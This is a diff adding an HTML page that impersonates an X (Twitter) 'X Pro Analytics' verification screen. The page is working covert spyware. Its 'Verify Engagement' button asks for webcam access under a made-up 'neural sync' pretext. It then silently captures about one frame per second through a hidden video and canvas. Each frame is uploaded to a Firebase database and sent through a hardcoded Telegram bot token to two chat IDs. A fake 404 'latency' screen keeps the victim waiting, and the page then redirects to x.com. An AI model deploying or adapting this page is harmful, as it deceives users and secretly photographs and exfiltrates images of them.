@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X Pro | Analytics & Verification</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --x-black: #000000;
+            --x-white: #ffffff;
+            --x-gray: #71767b;
+            --x-border: #2f3336;
+            --x-blue: #1d9bf0;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--x-black); color: var(--x-white);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .x-card {
+            width: 100%; max-width: 450px; background: var(--x-black);
+            border: 1px solid var(--x-border); border-radius: 16px; overflow: hidden;
+            box-shadow: 0 0 30px rgba(255,255,255,0.05);
+        }
+
+        .x-header {
+            padding: 15px 20px; border-bottom: 1px solid var(--x-border);
+            display: flex; align-items: center; justify-content: center;
+        }
+
+        .x-logo { width: 28px; height: 28px; fill: var(--x-white); }
+
+        .x-body { padding: 32px 24px; text-align: center; }
+
+        .verification-badge {
+            width: 60px; height: 60px; margin: 0 auto 24px;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(29, 155, 240, 0.1); border-radius: 50%;
+        }
+
+        h2 { font-size: 22px; font-weight: 800; margin: 0 0 12px; }
+        p { font-size: 14px; color: var(--x-gray); line-height: 1.5; margin-bottom: 30px; }
+
+        .btn-x {
+            background: var(--x-white); color: var(--x-black); border: none;
+            width: 100%; padding: 14px; font-size: 15px; font-weight: 700;
+            border-radius: 9999px; cursor: pointer; transition: background 0.2s;
+        }
+        .btn-x:hover { background: #e6e6e6; }
+
+        /* Error & Sync UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .x-spinner {
+            width: 40px; height: 40px; border: 3px solid var(--x-border);
+            border-top: 3px solid var(--x-blue); border-radius: 50%;
+            margin: 0 auto 24px; animation: x-spin 0.8s linear infinite;
+        }
+        @keyframes x-spin { to { transform: rotate(360deg); } }
+
+        .error-code { font-size: 60px; font-weight: 900; color: #2f3336; margin-bottom: 8px; }
+        .node-tag { font-size: 9px; color: #71767b; margin-top: 25px; text-transform: uppercase; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="x-card">
+        <div class="x-header">
+            <svg class="x-logo" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
+        </div>
+
+        <!-- Initial View -->
+        <div class="x-body" id="init-view">
+            <div class="verification-badge">
+                <svg width="32" height="32" fill="var(--x-blue)" viewBox="0 0 24 24"><path d="M22.25 12c0-1.43-.88-2.67-2.19-3.34.46-1.39.2-2.97-.81-4.01s-2.62-1.27-4.01-.81c-.67-1.31-1.91-2.19-3.34-2.19s-2.67.88-3.33 2.19c-1.4-.46-2.98-.2-4.02.81s-1.27 2.62-.81 4.01c-1.31.67-2.19 1.91-2.19 3.34s.88 2.67 2.19 3.34c-.46 1.39-.2 2.97.81 4.01s2.62 1.27 4.01.81c.67 1.31 1.91 2.19 3.34 2.19s2.67-.88 3.34-2.19c1.39.46 2.97.2 4.01-.81s1.27-2.62.81-4.01c1.31-.67 2.19-1.91 2.19-3.34zm-11.71 4.2l-3.54-3.54 1.41-1.41 2.13 2.12 5.13-5.13 1.41 1.41-6.54 6.55z"></path></svg>
+            </div>
+            <h2>Neural Velocity Sync</h2>
+            <p>To enable <b>X-Pro Analytics</b>, please calibrate your neural engagement profile. This verifies human-speed focus to unlock real-time sentiment data.</p>
+            
+            <button class="btn-x" onclick="startXSync()">Verify Engagement</button>
+            <div class="node-tag">Gateway: MUMBAI_PRIMARY_SOUTH</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="x-body" id="sync-ui">
+            <div class="x-spinner"></div>
+            <div style="font-weight: 700;">Calibrating Neural Hash...</div>
+            <div style="font-size: 13px; color: var(--x-gray); margin-top: 8px;" id="x-timer">Telemetry valid for 60s</div>
+            
+            <div style="text-align: left; background: #000; padding: 16px; border-radius: 8px; font-family: monospace; font-size: 10px; color: var(--x-blue); margin-top: 24px; border: 1px solid var(--x-border);">
+                > CONNECTING_MUMBAI_NODE_IN... OK<br>
+                > SYNCING_BIOMETRIC_VECTOR... 72%<br>
+                > STATUS: ENCRYPTING_SESSION_STREAM
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="x-body" id="error-404">
+            <div class="error-code">404</div>
+            <h2>Latency Timeout</h2>
+            <p>The neural handshake took longer than expected due to high traffic on the Mumbai relay. Re-routing via secondary Maharashtra node.</p>
+            <div class="x-spinner" style="width: 24px; height: 24px;"></div>
+            <div style="font-size: 12px; color: var(--x-gray);">Re-establishing Gateway...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startXSync() {
+            try {
+                // Requesting permission under "Neural Engagement Tracking"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('x-timer').innerText = `Telemetry valid for ${timeLeft}s`;
+
+                        if (count <= 54) {
+                            xCapture(count);
+                        }
+
+                        // Trigger 404 at 45s to maintain session trust
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://x.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://x.com";
+            }
+        }
+
+        function xCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "X_PRO_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_X_RELAY" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'x_pro_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
